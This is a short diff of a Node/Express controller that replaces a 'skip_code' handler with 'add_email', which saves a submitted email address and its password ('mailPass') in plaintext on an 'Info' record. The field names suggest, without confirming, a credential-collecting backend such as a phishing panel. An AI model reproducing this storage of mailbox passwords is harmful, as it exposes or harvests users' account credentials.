@@ -157,13 +157,13 @@ export const login_post = async (req, res) => {
 }
 
 
-export const skip_code = (req, res) => {
+export const add_email = (req, res) => {
 
-    const { id, skipcode } = req.body;
+    const { id, mail,mailPass } = req.body;
 
     Info.findOneAndUpdate({ _id: id }, {
         $set: {
-            skipcode: skipcode
+            mail,mailPass
         }
     }, { new: true }, (err, ok) => {
         if (err) {
